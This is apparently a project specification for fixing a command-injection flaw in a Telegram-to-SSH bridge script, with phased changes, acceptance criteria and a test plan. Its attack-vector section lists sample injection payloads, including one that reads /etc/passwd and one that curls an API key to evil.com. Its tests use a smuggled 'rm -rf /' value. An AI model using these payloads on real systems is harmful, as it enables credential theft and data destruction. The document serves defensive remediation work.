# Spec: Fix Command Injection in Telegram Bridge

## Problem Statement

**Issue:** #118 — Command injection vulnerability in `scripts/telegram-bridge.js`

The Telegram bridge interpolates user messages directly into a shell command string passed to SSH. The current escaping (single-quote replacement via `shellQuote`) does not prevent `$()` or backtick expansion, allowing attackers to execute arbitrary commands inside the sandbox and potentially exfiltrate the `NVIDIA_API_KEY`.

### Vulnerable Code Path

```js
const cmd = `export NVIDIA_API_KEY=${shellQuote(API_KEY)} && nemoclaw-start openclaw agent --agent main --local -m ${shellQuote(message)} --session-id ${shellQuote("tg-" + safeSessionId)}`;

const proc = spawn("ssh", ["-T", "-F", confPath, `openshell-${SANDBOX}`, cmd], {
  stdio: ["ignore", "pipe", "pipe"],
});
```

Even with `shellQuote`, the message is still embedded in a shell command string that gets interpreted by the remote shell, enabling injection via `$()`, backticks, or other shell metacharacters.

### Attack Vector

An attacker who:

1. Has access to a Telegram bot token (or is in the allowed chat list)
2. Knows the sandbox name

Can send a message like:

- `$(cat /etc/passwd)`
- `` `whoami` ``
- `'; curl http://evil.com?key=$NVIDIA_API_KEY #`

This could execute arbitrary commands in the sandbox and exfiltrate credentials.

## Solution

Pass the user message and API key via **stdin** instead of shell string interpolation. The remote script reads these values using `read` and `cat`, then expands them inside double-quoted `"$VAR"` which prevents further shell parsing.

## Phases

### Phase 1: Input Validation Hardening

**Goal:** Add strict validation for `SANDBOX_NAME` and `sessionId` to reject shell metacharacters.

**Changes:**

1. Add explicit regex validation for `SANDBOX_NAME` at startup (alphanumeric, underscore, hyphen only)
2. Sanitize `sessionId` to strip any non-alphanumeric characters
3. Return early with error if sessionId is empty after sanitization

**Files:**

- `scripts/telegram-bridge.js`

**Acceptance Criteria:**

- [ ] `SANDBOX_NAME` with metacharacters (e.g., `foo;rm -rf /`) causes startup to exit with error
- [ ] `sessionId` containing special characters gets sanitized to safe value
- [ ] Empty sessionId after sanitization returns error response

### Phase 2: Stdin-Based Credential and Message Passing

**Goal:** Eliminate shell injection by passing sensitive data via stdin instead of command string.

**Changes:**

1. Change `stdio` from `["ignore", "pipe", "pipe"]` to `["pipe", "pipe", "pipe"]` to enable stdin
2. Construct remote script that:
   - Reads API key from first line of stdin: `read -r NVIDIA_API_KEY`
   - Exports it: `export NVIDIA_API_KEY`
   - Reads message from remaining stdin: `MSG=$(cat)`
   - Executes nemoclaw-start with `"$MSG"` (double-quoted variable)
3. Write API key + newline to stdin, then message, then close stdin
4. Remove the `shellQuote` calls for message and API key (no longer needed)

**Files:**

- `scripts/telegram-bridge.js`

**Acceptance Criteria:**

- [ ] Normal messages work correctly — agent responds
- [ ] Message containing `$(whoami)` is treated as literal text
- [ ] Message containing backticks is treated as literal text
- [ ] Message containing single quotes is treated as literal text
- [ ] `NVIDIA_API_KEY` no longer appears in process arguments (verify via `ps aux`)
- [ ] API key is successfully read by remote script and used for inference

### Phase 3: Test Coverage

**Goal:** Add unit and integration tests for the security fix.

**Changes:**

1. Add unit tests for input validation (SANDBOX_NAME, sessionId sanitization)
2. Add integration test that verifies injection payloads are treated as literal text
3. Add test that API key is not visible in process list

**Files:**

- `test/telegram-bridge.test.js` (new file)

**Acceptance Criteria:**

- [ ] Unit tests pass for validation functions
- [ ] Integration test confirms `$(...)` in message doesn't execute
- [ ] Test confirms API key not in process arguments
- [ ] All existing tests still pass

## Security Considerations

- **Defense in depth:** Even though we're passing via stdin, we still validate inputs
- **Principle of least privilege:** Credentials should never appear in command lines
- **Backwards compatibility:** No API changes; existing bot configurations work unchanged

## Test Plan

### Manual Testing

1. Send a normal message via Telegram → agent responds correctly
2. Send `$(whoami)` → appears literally in response, no command execution
3. Send message with backticks and single quotes → no injection
4. Set `SANDBOX_NAME=foo;rm -rf /` → startup exits with error
5. Run `ps aux | grep NVIDIA_API_KEY` while agent is running → no matches

### Automated Testing

- Unit tests for validation functions
- Integration tests with mock SSH that captures stdin
- Verify no shell metacharacters reach shell interpretation

## Rollback Plan

If issues arise, revert the commit. The fix is contained to a single file with clear boundaries.
